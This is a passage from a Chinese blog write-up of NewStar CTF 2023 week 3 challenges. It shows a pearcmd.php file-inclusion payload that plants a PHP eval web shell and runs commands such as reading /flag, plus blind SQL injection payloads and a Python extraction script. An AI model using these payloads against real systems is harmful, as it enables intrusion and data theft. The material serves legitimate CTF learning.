

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="South">
  <meta name="keywords" content="">
  
    <meta name="description" content="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WPInclude ğŸä»£ç å®¡è®¡: 12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];        &#x2F;&#x2F;å°†æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¼ªåè®®banæ‰">
<meta property="og:type" content="article">
<meta property="og:title" content="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP">
<meta property="og:url" content="http://example.com/2023/11/03/2023-11-3-newstarweek3/index.html">
<meta property="og:site_name" content="South">
<meta property="og:description" content="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WPInclude ğŸä»£ç å®¡è®¡: 12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];        &#x2F;&#x2F;å°†æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¼ªåè®®banæ‰">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009114740035.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009114850048.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009115202206.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009115338558.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009115429049.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009115526916.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010205748567.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010215505760.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010215536171.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010133441613.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010133746261.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010141411989.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010141442978.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010141614595.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010141800190.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010162819362.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010163040317.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010163213824.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010161929907.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010162204147.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010162348128.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231010162449022.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231031192813120.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231013111032145.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028152657729.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028170204727.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028170420211.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028171513867.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028171757647.png">
<meta property="og:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231028171854336.png">
<meta property="article:published_time" content="2023-11-03T13:49:22.154Z">
<meta property="article:modified_time" content="2023-11-03T14:02:00.128Z">
<meta property="article:author" content="South">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/images/2023-11-3-newstar-3/image-20231009114740035.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP - South</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","app_key":"PmUqfFPhyiQDRYmHOO0IXjTV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>South</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-11-03 21:49" pubdate>
          2023å¹´11æœˆ3æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          51k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          428 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"><a href="#Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP" class="headerlink" title="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"></a>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</h1><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><p>ä»£ç å®¡è®¡:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-comment">//å°†æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¼ªåè®®banæ‰äº†</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">//æç¤ºphpinfo.phpæ–‡ä»¶</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>è®¿é—®phpinfo.php,å¹¶åœ¨å“åº”å†…å®¹ä¸­å¯»æ‰¾flagï¼š<br><img src="/images/2023-11-3-newstar-3/image-20231009114740035.png" srcset="/img/loading.gif" lazyload alt="image-20231009114740035"></p>
<p>å¯»æ‰¾ä¸€ä¸‹register_argc_argvï¼š</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231009114850048.png" srcset="/img/loading.gif" lazyload alt="image-20231009114850048"></p>
<p>å‘ç°register_argc_argvå¤„äºå¼€å¯çŠ¶æ€,æ‰€ä»¥å¯ä»¥[åˆ©ç”¨pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFI):<br>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨bpä¸Šä¼ payload,ç›´æ¥ç”¨æµè§ˆå™¨ä¸Šä¼ ä¼šå¯¼è‡´æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹è¢«urlç¼–ç åŒ–ï¼Œå¯¼è‡´phpè¯­è¨€å˜å½¢</p>
<p><img src="/images/2023-11-3-newstar-3/image-20231009115202206.png" srcset="/img/loading.gif" lazyload alt="image-20231009115202206"></p>
<p>æˆ‘ä»¬çš„æ–‡ä»¶è¢«æˆåŠŸåˆ›å»ºåœ¨&#x2F;tmpç›®å½•ä¸‹,ä¸ºtest.php</p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?file=/tmp/test.php<br>=&gt;ç”±äºåé¢å®ƒç»™æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸Šphp,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ å…¥æ–‡ä»¶åå³å¯<br>?file=/tmp/test	<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231009115338558.png" srcset="/img/loading.gif" lazyload alt="image-20231009115338558"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;ls /&quot;);<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231009115429049.png" srcset="/img/loading.gif" lazyload alt="image-20231009115429049"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231009115526916.png" srcset="/img/loading.gif" lazyload alt="image-20231009115526916"></p>
<h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27; GROUP BY 5 -- &#x27;<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å­—æ®µæ•°é‡ä¸º5</p>
<p>ä½¿ç”¨ç›²æ³¨ï¼š<br>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=1) -- &#x27;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010205748567.png" srcset="/img/loading.gif" lazyload alt="image-20231010205748567"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=2) -- &#x27;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010215505760.png" srcset="/img/loading.gif" lazyload alt="image-20231010215505760"></p>
<p>å­˜åœ¨sqlæ³¨å…¥ç›²æ³¨ç‚¹</p>
<p>çˆ†è¡¨:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((sElect(GROUP_CONCAT(TABLE_NAME))frOm(infOrmation_schema.tables)wHere(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure>

<p>è¾“å‡º:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¬¬1å¼ è¡¨çš„åå­—ä¸ºgrades,here_is_flag<br>[&#x27;grades,here_is_flag           &#x27;]<br></code></pre></td></tr></table></figure>

<p>çˆ†è¡¨çš„å­—æ®µ:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;here_is_flagç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;here_is_flag&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># 